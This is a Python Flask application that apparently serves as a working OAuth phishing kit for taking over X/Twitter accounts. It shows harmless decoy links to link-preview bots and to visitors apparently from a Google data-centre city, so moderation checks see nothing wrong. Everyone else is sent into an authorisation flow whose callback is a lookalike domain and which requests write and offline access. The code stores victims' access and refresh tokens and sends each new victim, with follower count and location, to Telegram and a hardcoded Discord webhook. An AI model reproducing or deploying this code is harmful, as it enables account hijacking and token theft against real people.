import os
import json
import base64
import secrets
import requests
from datetime import datetime
from pymongo import MongoClient
from pymongo.server_api import ServerApi
from flask import Flask, request, redirect, session

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

client = MongoClient(os.environ["MONGO_URI"], server_api=ServerApi('1'))
db = client['cobra_db']
groups = db['groups']
spoofs = db['spoofs']

try:
    client.admin.command('ping')
    print("[+] MongoDB connected successfully.")
except Exception as e:
    print("[-] MongoDB connection failed:", e)

@app.route('/link')
def link():
    user_agent = request.headers.get('User-Agent', '').strip()
    print(user_agent)
    v = request.args.get('v')
    data = spoofs.find_one({ "spoof_id": v })
    
    if 'Twitterbot/1.0' in user_agent or 'TelegramBot' in user_agent or 'Discordbot' in user_agent or 'InstagramBot' in user_agent or 'facebookexternalhit' in user_agent:
        return redirect(data["spoof"])
    
    return redirect(data["redirect"])

@app.route('/oauth')
def oauth():
    user_agent = request.headers.get('User-Agent', '').strip()
    identifier = request.args.get('identifier')

    if not identifier:
        return "⚠️ Identifier is required.", 400

    group = groups.find_one(
        {"identifier": {"$in": [identifier]}}
    )
    if not group:
        return "⚠️ Identifier is invalid.", 404
    
    i = group["identifier"].index(identifier)
    twitter = group.get("twitter_settings")[i]
    session["redirect_url"] = group.get('redirect')[i]
    spoof = group.get("spoof")[i]

    session["client_id"] = twitter["client_id"]
    session["client_secret"] = twitter["client_secret"]
    
    session["group_id"] = group.get("group_id")
    
    if 'Twitterbot/1.0' in user_agent or 'TelegramBot' in user_agent or 'Discordbot' in user_agent:
        return redirect(spoof)

    real_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    res = requests.get(f'http://ip-api.com/json/{real_ip}')
    location_data = res.json()
    
    country, city = location_data.get("country"), location_data.get("city")
    if city != "The Dalles":
        country_flag = ''.join(chr(ord(c) + 127397) for c in location_data.get("countryCode", ""))

        message = f'🌐 *Connection:* {real_ip}\n\n{country_flag} *{city}, {country}*'
        send_telegram_message(group['group_id'], message)

        twitter_oauth_url = generate_twitter_oauth_url()
        return redirect(twitter_oauth_url)
    else:
        return redirect(spoof)


def generate_twitter_oauth_url():
    TWITTER_CLIENT_ID = session.get("client_id")
    TWITTER_CALLBACK_URL = 'https%3A%2F%2Fus01-x.com%2Fauth'
    return (f'https://x.com/i/oauth2/authorize?response_type=code&client_id={TWITTER_CLIENT_ID}'
            f'&redirect_uri={TWITTER_CALLBACK_URL}'
            f'&scope=tweet.read+users.read+tweet.write+media.upload+offline.access+tweet.moderate.write'
            f'&state=state&code_challenge=challenge&code_challenge_method=plain')


@app.route('/auth')
def auth_callback():
    authorization_code = request.args.get('code')
    if not authorization_code:
        return redirect("https://x.com/")
        
    access_token, refresh_token = exchange_token_for_access(authorization_code)
    
    user_data = get_twitter_user_data(access_token)
    user_id = user_data['id']
    username = user_data['username']
    followers_count = user_data['public_metrics']['followers_count']
    
    real_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    location_res = requests.get(f'http://ip-api.com/json/{real_ip}')
    location_data = location_res.json()
    country, city = location_data.get("country"), location_data.get("city")
    country_flag = ''.join(chr(ord(c) + 127397) for c in location_data.get("countryCode", ""))
    location = f"{country_flag} {city}, {country}"
    
    authorization_time = datetime.utcnow()
    
    group_id = session.get("group_id")
    existing_user = groups.find_one({
        "group_id": group_id,
        "authenticated_users.user_id": user_id
    })
    
    if existing_user:
        groups.update_one(
            {"group_id": group_id, "authenticated_users.user_id": user_id},
            {"$set": {
                "authenticated_users.$.username": username,
                "authenticated_users.$.location": location,
                "authenticated_users.$.access_token": access_token,
                "authenticated_users.$.refresh_token": refresh_token
            }}
        )
    else:
        TWITTER_CLIENT_ID = session.get("client_id")
        TWITTER_CLIENT_SECRET = session.get("client_secret")
        credentials = base64.b64encode(f"{TWITTER_CLIENT_ID}:{TWITTER_CLIENT_SECRET}".encode()).decode('utf-8')
        groups.update_one(
            {"group_id": group_id},
            {
                "$push": {
                    "authenticated_users": {
                        "user_id": user_id,
                        "username": username,
                        "location": location,
                        "access_token": access_token,
                        "refresh_token": refresh_token,
                        "credentials": credentials,
                        "authorized_at": authorization_time
                    }
                }
            }
        )
    
    if group_id == -1002433325091:
        embed = {
            "title": "🐍 New User Authorized",
            "color": 0x00A550,
            "fields": [
                {
                    "name": "👤 Account",
                    "value": f"[{username}](https://x.com/{username})",
                    "inline": False
                },
                {
                    "name": "👥 Followers",
                    "value": f"{followers_count}",
                    "inline": False
                }
            ]
        }
        
        payload = {
            "content": "@everyone",
            "embeds": [embed],
        }
        
        requests.post("https://discord.com/api/webhooks/1334653439673897103/IjwKe1YStWUVrBfQZlRE1Kz8mfFv8KkCiHZIsbUd7OCJUF7HghhE0jfzFyCt-puJdBsA", data=json.dumps(payload), headers={"Content-Type": "application/json"})
    
    send_to_telegram(username, followers_count, group_id)
    return redirect(session.get("redirect_url", "https://x.com/"))


def exchange_token_for_access(authorization_code):
    TWITTER_CLIENT_ID = session.get("client_id")
    TWITTER_CLIENT_SECRET = session.get("client_secret")
    credentials = base64.b64encode(f"{TWITTER_CLIENT_ID}:{TWITTER_CLIENT_SECRET}".encode()).decode('utf-8')

    token_exchange_url = 'https://api.twitter.com/2/oauth2/token'
    request_data = {
        'grant_type': 'authorization_code',
        'code': authorization_code,
        'redirect_uri': 'https://us01-x.com/auth',
        'code_verifier': "challenge"
    }
    headers = {
        'Authorization': f'Basic {credentials}',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    response = requests.post(token_exchange_url, data=request_data, headers=headers)
    return response.json().get('access_token'), response.json().get('refresh_token')


def get_twitter_user_data(access_token):
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json',
    }
    params = {
        'user.fields': 'public_metrics'
    }
    response = requests.get('https://api.twitter.com/2/users/me', headers=headers, params=params)
    return response.json().get('data', {})
    
    
def format_followers(followers_count):
    if followers_count < 1000:
        return str(followers_count)
    elif 1000 <= followers_count < 1000000:
        return f'{followers_count / 1000:.2f}K'
    else:
        return f'{followers_count / 1000000:.2f}M'


def send_to_telegram(username, followers_count, group_id):
    followers_count = format_followers(followers_count)
    message = (f'🐍 *User [{username}](https://x.com/{username}) has authorized.*\n'
               f'👥 *Followers:* {followers_count}')
    
    send_telegram_message(group_id, message)


def send_telegram_message(chat_id, message):
    message = message.replace(".", "\\.").replace("-", "\\-").replace("!", "\\!").replace("_", "\\_")
    
    bot_token = os.environ["TELEGRAM_BOT_TOKEN"]
    requests.post(
        f'https://api.telegram.org/bot{bot_token}/sendMessage',
        data={
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'MarkdownV2'
        })


if __name__ == '__main__':
    app.run()